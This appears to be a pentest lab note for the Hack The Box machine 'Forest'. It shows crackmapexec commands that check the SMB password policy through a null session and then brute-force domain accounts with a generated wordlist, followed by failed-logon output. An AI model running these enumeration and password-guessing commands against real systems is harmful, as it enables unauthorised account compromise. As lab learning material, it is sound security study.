# Bruteforcing with generated wordlist
## Knowing if Bruteforcing does not lockout accounts
Before we do bruteforcing, we should make sure we dont lockout the target account.
So to know if there is lockout policy for target account , we perform `null authentication` attack via command `crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''` which gives the following output.
![[Pasted image 20210727100616.png]]
Which tells that `null authentication` is enabled and allows for domain enumeration and we can get bunch of information. 
## Bruteforcing using crackmapexec
Using command `crackmapexec smb 10.10.10.161 -u userlist.out -p pwlist.txt`
to bruteforce users, output is as follows.
```bash
❯ crackmapexec smb 10.10.10.161 -u userlist.out -p pwlist.txt                                                                                   
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019april2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019April2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019ApriL2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AprIl2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019ApRil2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019APril2 STATUS_LOGON_FAILURE                                                                                                        
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019august2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019August2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AugusT2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AuguSt2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AugUst2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AuGust2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AUgust2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019autumn2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019Autumn2 STATUS_LOGON_FAILURE                                                                                                       
SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AutumN2 STATUS_LOGON_FAILURE  
```





